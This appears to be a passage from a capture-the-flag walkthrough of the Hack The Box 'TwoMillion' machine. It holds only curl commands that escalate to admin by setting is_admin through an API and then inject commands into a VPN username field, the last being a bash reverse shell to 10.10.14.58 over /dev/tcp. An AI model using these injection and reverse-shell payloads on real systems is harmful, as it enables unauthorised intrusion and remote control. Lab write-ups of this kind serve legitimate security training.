...
```bash
echo "MEZRM1otNklINDUtVDk5NUItQk05TjA=" | base64 -d
```
...
```bash
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" | jq
```
...
```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json"| jq
```
...
```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json" -d '{"email":"bea@gmail.com"}'| jq
```
...
```bash
curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json" -d '{"email":"bea@gmail.com", "is_admin":1}'| jq
```
...
```bash
curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" | jq
```
...
```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" | jq
```
...
```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json"| jq
```
...
```
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json" -d '{"username":"beafn28"}'| jq
```
...
```bash
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json" -d '{"username":"prueba; whoami;"}'
```
...
```
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=j4ckt8eiv8lcp24vnnj4bfk04v" -H "Content-Type: application/json" -d '{"username": "prueba; bash -c \"bash -i >& /dev/tcp/10.10.14.58/443 0>&1\";"}'
```
